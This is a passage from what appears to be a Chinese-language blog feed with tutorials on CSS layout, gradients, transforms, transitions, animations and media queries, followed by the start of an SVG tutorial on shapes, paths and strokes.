class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.item&#123;</span><br><span class="line">  align-self: auto | flex-start | flex-end | center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="4-4-flex布局实例"><a href="#4-4-flex布局实例" class="headerlink" title="4.4 flex布局实例"></a>4.4 flex布局实例</h4><ul><li>网格布局，平均分布<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;}.item{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item"></div>  <div class="item"></div>  <div class="item"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.item&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;box&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">  &lt;div class=&quot;item&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>百分比布局<style>.box{  width:100%;  height:50px;  display:flex;  margin-top:10px;  background:#f6f6f6;  text-align:center;}.item1{  background:#fff;  margin:10px;  flex:0 0 25%;}.item2{  background:#fff;  margin:10px;  flex:1;}</style><div class="box">  <div class="item1">1/4</div>  <div class="item2">auto</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.box&#123;</span><br><span class="line">  display:flex;</span><br><span class="line">&#125;</span><br><span class="line">.item1&#123;</span><br><span class="line">  flex:0 0 25%;</span><br><span class="line">&#125;</span><br><span class="line">.item2&#123;</span><br><span class="line">  flex:1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>圣杯布局： 页面从上到下，分成header, body, footer。其body从左到右又分为导航，主栏，副栏。<br>固定的底栏：页面内容太少，无法占满一屏的高度，底栏就会抬高到页面的中间，这时可以采用该布局。<style>.box1{  display: flex;  display: -ms-flexbox;  min-height: 200px;  flex-direction: column;  -ms-flex-direction: column;  margin-top: 10px;  background:#f6f6f6;  text-align: center;  padding:10px;}.box1 div{  background: #fff;}.box1 .box1-container{  background: #f6f6f6;}.box1 .box1-header{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1 .box1-footer{  flex:0 0 20px;  -ms-flex: 0 0 20px;}.box1-container{  flex: 1;  display:flex;  margin: 10px 0;}.box1-aside{  order: -1;  flex: 0 0 50px;  margin-right: 10px;}.box1-right-aside{  order: 1;  flex: 0 0 100px;  margin-left: 10px;}.box1-content{  flex: 1;  -ms-flex: 1;}</style><div class="box1">  <div class="box1-header">header</div>  <div class="box1-container">    <div class="box1-aside">aside</div>    <div class="box1-content">content</div>    <div class="box1-right-aside">right-aside</div>  </div>    <div class="box1-footer">footer</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">.app&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.box&#123;</span><br><span class="line">  display: flex;</span><br><span class="line">  min-height: 100vh;</span><br><span class="line">  flex-direction: column;</span><br><span class="line">  width: 100%;</span><br><span class="line">&#125;</span><br><span class="line">.header, .footer&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">.container&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">  display: flex;</span><br><span class="line">&#125;</span><br><span class="line">.aside, .right-aside&#123;</span><br><span class="line">  flex: 0 0 100px;</span><br><span class="line">&#125;</span><br><span class="line">.content&#123;</span><br><span class="line">  flex: 1;</span><br><span class="line">&#125;</span><br><span class="line">&lt;div class=&quot;app&quot;&gt;</span><br><span class="line">  &lt;div class=&quot;box&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;header&quot;&gt;header&lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">      &lt;div class=&quot;aside&quot;&gt;aside&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;content&quot;&gt;content&lt;/div&gt;</span><br><span class="line">      &lt;div class=&quot;right-aside&quot;&gt;right-aside&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">    &lt;div class=&quot;footer&quot;&gt;footer&lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li><p>流式布局: 每行的项目数固定，会自动分行</p><style>.parent {  width: 100%;  height: 150px;  background-color: #f6f6f6;  display: flex;  flex-flow: row wrap;  padding: 10px;}.child {  box-sizing: border-box;  background-color: #fff;  flex: 0 0 30%;  height: 50px;  margin: 10px 1.5% 0;}</style><div class="parent">  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div>  <div class="child"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.parent &#123;</span><br><span class="line">  width: 100%;</span><br><span class="line">  height: 150px;</span><br><span class="line">  display: flex;</span><br><span class="line">  flex-flow: row wrap;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.child &#123;</span><br><span class="line">  box-sizing: border-box;</span><br><span class="line">  flex: 0 0 30%;</span><br><span class="line">  height: 50px;</span><br><span class="line">  margin: 10px 1.5% 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-渐变"><a href="#5-渐变" class="headerlink" title="5. 渐变"></a>5. 渐变</h3><ul><li><p>线性渐变</p><style>.line1, .line2{  width: 100%;  height: 8px;  margin-top: 20px;}.line1{  background-image:linear-gradient(to right, yellow, green);}.line2{  background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);}</style><div class="line1"></div><div class="line2"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 关键字可使用to top, to top left等</span><br><span class="line">background-image: linear-gradient(to left / 90deg, orange, green);</span><br><span class="line"></span><br><span class="line">// 自定义渐变</span><br><span class="line">background-image: linear-gradient(to left, #fff 0%, #000 50%, #fff 100%);</span><br></pre></td></tr></table></figure></li><li><p>径向渐变</p><style>.gradient-block div{  display: inline-block;  width: 100px;  height: 50px;}.block1 {  background-image: radial-gradient(circle, yellow, green)}.block2{  background-image: radial-gradient(circle at top, yellow, green)}.block3{  background-image: radial-gradient(ellipse, yellow, green)}.block4{  background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)}.block5{  background-image: radial-gradient(circle, yellow 10%, green 20%, orange 80%)}.block6{  background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)}</style><div class="gradient-block">  <div class="block1"></div>  <div class="block2"></div>  <div class="block3"></div>  <div class="block4"></div>  <div class="block5"></div>  <div class="block6"></div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">// 原形渐变</span><br><span class="line">background-image: radial-gradient(circle, yellow, green)</span><br><span class="line">background-image: radial-gradient(circle at top, yellow, green)</span><br><span class="line"></span><br><span class="line">// 椭圆渐变</span><br><span class="line">background-image: radial-gradient(ellipse, yellow, green)</span><br><span class="line"></span><br><span class="line">// 自定义圆心和半径([minor radius] [major radius] at x y) 可以用百分比</span><br><span class="line">background-image: radial-gradient(100px 100px at 30px 30px, yellow, green)</span><br><span class="line"></span><br><span class="line">// 多色渐变</span><br><span class="line">background-image: radial-gradient(circle, yellow 10%, green 50%, orange 80%)</span><br><span class="line"></span><br><span class="line">// 重复镜像渐变</span><br><span class="line">background-image: repeating-radial-gradient(yellow, green 10px, orange 20px)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="6-变形-transform"><a href="#6-变形-transform" class="headerlink" title="6. 变形 transform"></a>6. 变形 transform</h3><p>CSS变形允许动态的控制元素，可以在屏幕周围移动它们，缩小或扩大，旋转，或结合产生复杂的动画效果。一系列的<code>&lt;transform-function&gt;</code>，表示一个或多个变形函数，以空格分开，代表同时对一个元素进行变形的多种属性操作。<br><style>  .transform div{    width: 100px;    height: 50px;    background-color: green;    color: #fff;    display: inline-block;    vertical-align: middle;    text-align: center;    line-height: 50px;  }  .transform1:hover{    transform: scale(1.5) rotate(30deg)  }  .transform2{    transform: rotate(30deg);    transform-origin: 100% 100%;  }</style><div class="transform">  <div class="transform1">hover me</div>  <div class="transform2"></div></div></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">transform: none | &lt;transform-function&gt; &lt;transform-function&gt; ..</span><br><span class="line"></span><br><span class="line">// 基本变形</span><br><span class="line">transform: translate(40px, 40px) scale(1.5) rotate(30deg)</span><br><span class="line"></span><br><span class="line">// 指定中心点</span><br><span class="line">transform-origin: 100% 100%</span><br></pre></td></tr></table></figure><p><br></p><table><thead><tr><th>2D transform函数</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td>translate(10px, 10px)</td><td style="text-align:center">移动元素。扩展函数translateX(), translateY()</td></tr><tr><td>scale(1.5)</td><td style="text-align:center">缩小或放大元素。扩展函数scaleX(), scaleY()</td></tr><tr><td>rotate(10deg)</td><td style="text-align:center">旋转元素</td></tr><tr><td>skew(10deg)</td><td style="text-align:center">让元素倾斜。扩展函数skewX(), skewY()</td></tr><tr><td>matrix()</td><td style="text-align:center">定义矩阵变形，重新定位元素位置</td></tr><tr><td><strong>3D transform函数</strong></td><td style="text-align:center">translate3d(), translate(), scale3d(), scaleZ(), rotate3d(), <br>rotateX(), rotateY(), rotateZ(), perspective(), matrix3d()</td></tr><tr><td><strong>其他属性</strong></td><td style="text-align:center"></td></tr><tr><td>transform-origin</td><td style="text-align:center">指定元素的中心点的位置</td></tr><tr><td>transform-style</td><td style="text-align:center"><code>flat</code>2D平面呈现， <code>preserve-3d</code>3D空间中呈现</td></tr></tbody></table><p><br></p><h3 id="7-过渡-transition"><a href="#7-过渡-transition" class="headerlink" title="7. 过渡 transition"></a>7. 过渡 transition</h3><p>CSS的transition允许CSS的属性值在一定的时间区间内平滑地过渡。<br><style>.transition div{  width: 100px;  height: 100px;  background-color: green;  text-align: center;  color: #fff;  line-height: 100px;  display: inline-block;  vertical-align: middle;}.transition1:hover{  background-color: orange;  border-radius: 50%;  transition: background 0.5s linear 0s, border-radius 0.2s ease-in 0s;}</style><div class="transition">  <div class="transition1">hover me</div></div></p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">transition: &lt;transition-property&gt; &lt;transition-duration&gt; </span><br><span class="line">            &lt;transition-timing-function&gt; &lt;transition-delay&gt; , ...</span><br><span class="line"></span><br><span class="line">// 速记: transition: property, duration, animation type, delay</span><br></pre></td></tr></table></figure><p><em><code>transition-property</code></em><br>指定过渡或动态模拟的CSS属性。<br>支持transition过渡功能的CSS属性: background-color, background-position, opacity, border, outline, margin, padding, width, height, min/max-width/height, top/bottom/left/right, color, font-size, font-weight, letter-spacing, line-height, text-indent, text-shadow, vertical-align, word-spacing, z-index, visibility</p><p><em><code>transition-duration</code></em><br>指定完成过渡所需的时间，单位为s或ms(毫秒)。</p><p><em><code>transition-timing-function</code></em><br>指定过渡函数。<br>ease: 默认值，过渡速度由快到慢，逐渐变慢<br>linear: 恒速<br>ease-in: 加速<br>ease-out: 减速<br>ease-in-out: 先加速后减速</p><p><em><code>transition-delay</code></em><br>指定过渡开始出现的延迟时间，单位为s或ms(毫秒)。</p><p><br></p><h3 id="8-动画-keyframes"><a href="#8-动画-keyframes" class="headerlink" title="8. 动画 @keyframes"></a>8. 动画 @keyframes</h3><style>@keyframes wobble{  0%{ margin-left: 100px; background: green; }  40%{ margin-left: 150px; background: orange; }  60%{ margin-left: 75px; background: blue; }  100%{ margin-left: 100px; background: red; }}.animation{  width: 100px;  height: 100px;  animation: wobble 2s ease-in 0s infinite;}</style><div class="animation"></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@keyframes wobble&#123;</span><br><span class="line">  0%&#123; margin-left: 100px; background: green; &#125;</span><br><span class="line">  40%&#123; margin-left: 150px; background: orange; &#125;</span><br><span class="line">  60%&#123; margin-left: 75px; background: blue; &#125;</span><br><span class="line">  100%&#123; margin-left: 100px; background: red; &#125;</span><br><span class="line">&#125;</span><br><span class="line">.animation&#123;</span><br><span class="line">  width: 100px;</span><br><span class="line">  height: 100px;</span><br><span class="line">  animation: wobble 2s ease-in 0s infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>简写规则<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">animation: &lt;animation-name&gt; &lt;animation-duration&gt;</span><br><span class="line">           &lt;animation-timing-function&gt; &lt;animation-delay&gt;</span><br><span class="line">           &lt;animation-iteration-count&gt; &lt;animation-direction&gt;</span><br><span class="line">           &lt;animation-play-state&gt; &lt;animation-fill-mode&gt;, ...</span><br></pre></td></tr></table></figure></p><p><em><code>@keyframes</code></em><br>关键帧， 由@keyframes开头，后面紧跟动画的名称，加上一对花括号，里面的样式规则由多个百分比构成，每个百分比中是不同的CSS样式。</p><p><em><code>animation-name</code></em><br>指定一个关键帧动画的名字，这个动画名必须对应一个@keyframes规则</p><p><em><code>animation-duration</code></em><br>设置动画播放所需时间，也就是完成从0%~100%一次动画所需时间。单位为s</p><p><em><code>animation-timing-function</code></em><br>设置动画的播放方式，变换方式ease, ease-in, ease-in-out, ease-out, linear, cubic-bezier。</p><p><em><code>animation-delay</code></em><br>指定动画开始时间，单位为s</p><p><em><code>animation-iteration-count</code></em><br>指定动画播放的循环次数。 <code>infinite | &lt;integer&gt;</code></p><p><em><code>animation-direction</code></em><br>指定动画的播放方向, normal为向前播放，alternate为反方向播放</p><p><em><code>animation-play-state</code></em><br>控制动画的播放状态, paused将正在播放的动画停下来， runing将暂停的动画重新播放</p><p><em><code>animation-fill-mode</code></em><br>定义动画开始前和结束后发生的操作。none按预期进行和结束，动画完成其最后一帧时，动画会翻转到初始帧处。 forwards 动画结束后继续应用最后帧的位置。 backwards 在向元素应用动画样式时迅速应用动画的初始帧。 both元素动画同时具有forwards和backwards的效果。</p><p><br></p><h3 id="9-媒体查询"><a href="#9-媒体查询" class="headerlink" title="9. 媒体查询"></a>9. 媒体查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@media screen and (max-width:600px)&#123;&#125;</span><br><span class="line">@media screen and (min-width:600px) and (max-width:900px)&#123;&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="10-meta标签"><a href="#10-meta标签" class="headerlink" title="10. meta标签"></a>10. meta标签</h3><p>当responsive页面在手机测试的时候，会发现媒体查询都不会生效——页面仍展示位普通样式，只是全局缩小了。 这时需要添加<code>meta</code>标签<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta name=&quot;viewport&quot; content=&quot;width=device-width,initial-scale=1.0&quot;&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS" target="_blank" rel="noopener">MDN - CSS层叠样式表</a></li><li><a href="http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html" target="_blank" rel="noopener">Flex 布局教程：语法篇</a></li><li>《图解CSS3·核心技术与案例实践》 大漠[著]</li></ul>]]></content>
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>SVG文档</title>
      <link href="/2018/10/06/SVG%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/SVG%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<p>SVG文档由<code>&lt;svg&gt;</code>根元素和基本形状元素(用于定义圆形、矩形、简单或复杂的曲线)构成。还有一个<code>&lt;g&gt;</code>元素，用来把若干基本形状编成一个组。SVG支持渐变、旋转、滤镜效果、JS接口等功能。<br><br></p><h3 id="1-基本属性"><a href="#1-基本属性" class="headerlink" title="1. 基本属性"></a>1. 基本属性</h3><ul><li><code>version 和 baseProfile</code> : 用于确定SVG版本,是必不可少的。</li><li><code>&lt;object&gt;</code> : 可以通过该元素引用SVG文件</li><li><code>viewBox</code>: 定义画布上可以显示的区域，从(0, 0)点开始， 100宽*100高的区域。这100的区域，会放到200*200的画布上显示，形成了放大两倍的效果。</li><li>SVG里的属性值必须用引号引起来<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg version=&quot;1.1&quot;</span><br><span class="line">     baseProfile=&quot;full&quot;</span><br><span class="line">     width=&quot;300&quot; height=&quot;200&quot;</span><br><span class="line">     viewBox=&quot;0 0 100 100&quot;</span><br><span class="line">     xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">&lt;/svg&gt;</span><br><span class="line">&lt;object data=&quot;image.svg&quot; type=&quot;image/svg+xml&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="2-基本形状"><a href="#2-基本形状" class="headerlink" title="2. 基本形状"></a>2. 基本形状</h3><ul><li><p>矩形<br>(x,y) 矩形左上角的位置， width height宽高， rx ry圆角的半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;30&quot; height=&quot;30&quot; rx=&quot;10&quot; ry=&quot;10&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>圆形<br>(cx, cy) 圆心的位置， r 圆的半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;circle cx=&quot;25&quot; cy=&quot;75&quot; r=&quot;20&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>椭圆<br>(cx, cy) 椭圆中心的位置, rx ry 椭圆的x,y半径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;ellipse cx=&quot;75&quot; cy=&quot;75&quot; rx=&quot;20&quot; ry=&quot;5&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>直线<br>(x1, y1) 起点的位置， (x2, y2) 终点的位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;line x1=&quot;10&quot; x2=&quot;50&quot; y1=&quot;110&quot; y2=&quot;150&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>折线<br>points=”x1 y1, x2 y2, x3 y3” 点集数列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;60 110, 65 120, 70 115, 75 130, 80 125, 85 140, 90 135, 95 150, 100 145&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>多边形<br>points=”x1 y1, x2 y2, x3 y3” 点集数列，路径最后一个点自动回到第一个点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;polygon points=&quot;50 160, 55 180, 70 180, 60 190, 65 205, 50 195, 35 205, 40 190, 30 180, 45 180&quot; /&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="3-路径"><a href="#3-路径" class="headerlink" title="3. 路径"></a>3. 路径</h3><p><em>d</em>: 命令+参数的序列，关于如何绘制路径的信息。<strong>命令方式</strong> : 一种用大写字母，表示采用绝对定位。另一种用小写字母，表示采用相对定位。</p><h4 id="3-1-直线命令"><a href="#3-1-直线命令" class="headerlink" title="3.1 直线命令"></a>3.1 直线命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 H 90 V 90 H 10 Z&quot; fill=&quot;transparent&quot; stroke=&quot;black&quot;/&gt;</span><br><span class="line">// M x y  : move to 移动画笔</span><br><span class="line">// L x y  : line to 画一条线段</span><br><span class="line">// H x    : 简写命令，绘制平行线</span><br><span class="line">// V y    : 简写命令，绘制垂直线 </span><br><span class="line">// Z      : 闭合路径</span><br></pre></td></tr></table></figure><h4 id="3-2-曲线命令"><a href="#3-2-曲线命令" class="headerlink" title="3.2 曲线命令"></a>3.2 曲线命令</h4><h5 id="3-2-1-三次贝塞尔曲线"><a href="#3-2-1-三次贝塞尔曲线" class="headerlink" title="3.2.1 三次贝塞尔曲线"></a>3.2.1 三次贝塞尔曲线</h5><p>如果S命令跟在一个C命令或者另一个S命令的后面，它的第一个控制点，就会被假设成前一个控制点的对称点。如果S命令单独使用，前面没有C命令或者另一个S命令，那么它的两个控制点就会被假设为同一个点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M10 10 C 20 20, 40 20, 50 10&quot; stroke=&quot;black&quot; fill=&quot;transparent&quot;/&gt;</span><br><span class="line">// C x1 y1, x2 y2, x y | (x1,y1)起点的控制点， (x2,y2)终点的控制点， (x,y)曲线的终点</span><br><span class="line">// S x2 y2, x y        | 简写</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/SVG文档/1.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-2-二次贝塞尔曲线"><a href="#3-2-2-二次贝塞尔曲线" class="headerlink" title="3.2.2 二次贝塞尔曲线"></a>3.2.2 二次贝塞尔曲线</h5><p>T命令前面必须是一个Q命令，或者是另一个T命令，控制点为前一个控制点的对称点。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// Q x1 y1, x y        | (x1,y1)控制点， (x,y)终点</span><br><span class="line">// T x  y              | 简写</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/SVG文档/2.png" style="max-width: 380px"></p><p><br><br><br></p><h5 id="3-2-3-弧形"><a href="#3-2-3-弧形" class="headerlink" title="3.2.3 弧形"></a>3.2.3 弧形</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// A rx ry x-axis-rotation large-arc-flag sweep-flag x y</span><br><span class="line">// A x轴半径 y轴半径 x轴旋转角度 角度大小 弧线方向 弧形的终点(x,y) </span><br><span class="line">// a rx ry x-axis-rotation large-arc-flag sweep-flag dx dy</span><br><span class="line">&lt;svg width=&quot;325px&quot; height=&quot;325px&quot; version=&quot;1.1&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot;&gt;</span><br><span class="line">  &lt;path d=&quot;M80 80</span><br><span class="line">           A 45 45, 0, 0, 0, 125 125</span><br><span class="line">           L 125 80 Z&quot; fill=&quot;green&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 80</span><br><span class="line">           A 45 45, 0, 1, 0, 275 125</span><br><span class="line">           L 275 80 Z&quot; fill=&quot;red&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M80 230</span><br><span class="line">           A 45 45, 0, 0, 1, 125 275</span><br><span class="line">           L 125 230 Z&quot; fill=&quot;purple&quot;/&gt;</span><br><span class="line">  &lt;path d=&quot;M230 230</span><br><span class="line">           A 45 45, 0, 1, 1, 275 275</span><br><span class="line">           L 275 230 Z&quot; fill=&quot;blue&quot;/&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p><img src="/2018/10/06/SVG文档/3.png" style="max-width: 380px"><br><br></p><h3 id="4-填充与边框"><a href="#4-填充与边框" class="headerlink" title="4. 填充与边框"></a>4. 填充与边框</h3><ul><li><p>上色 : stroke, fill, stroke-opacity, fill-opacity</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;rect x=&quot;10&quot; y=&quot;10&quot; width=&quot;100&quot; height=&quot;100&quot; stroke=&quot;blue&quot; fill=&quot;purple&quot;</span><br><span class="line">      fill-opacity=&quot;0.5&quot; stroke-opacity=&quot;0.8&quot;/&gt;</span><br><span class="line"></span><br><span class="line">// 使用CSS设置fill和stroke</span><br><span class="line">&lt;rect x=&quot;10&quot; height=&quot;180&quot; y=&quot;10&quot; width=&quot;180&quot; style=&quot;stroke: black; fill: red;&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>描边 : stroke-width, stroke-linecap = “butt/square/round”, stroke-linejoin = “miter/round/bevel”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;polyline points=&quot;40 60 80 20 120 60&quot; stroke=&quot;black&quot; stroke-width=&quot;20&quot;</span><br><span class="line">      stroke-linecap=&quot;butt&quot; fill=&quot;none&quot; stroke-linejoin=&quot;miter&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>虚线 : stroke-dasharray 数列用来描述虚线</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;path d=&quot;M 10 75 Q 50 10 100 75 T 190 75&quot; stroke=&quot;black&quot;</span><br><span class="line">    stroke-linecap=&quot;round&quot; stroke-dasharray=&quot;5,10,5&quot; fill=&quot;none&quot;/&gt;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h3 id="5-渐变与图案"><a href="#5-渐变与图案" class="headerlink" title="5. 渐变与图案"></a>5. 渐变与图案</h3><ul><li><p>线性渐变<br>在SVG文件的<code>&lt;defs&gt;</code>元素内部，创建一个<code>&lt;linearGradient&gt;</code>节点。<code>&lt;linearGradient&gt;</code>中的(x1,y1) (x2,y2) 定义了渐变路线走向。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg width=&quot;100&quot; height=&quot;100&quot; version=&quot;1.1&quot; 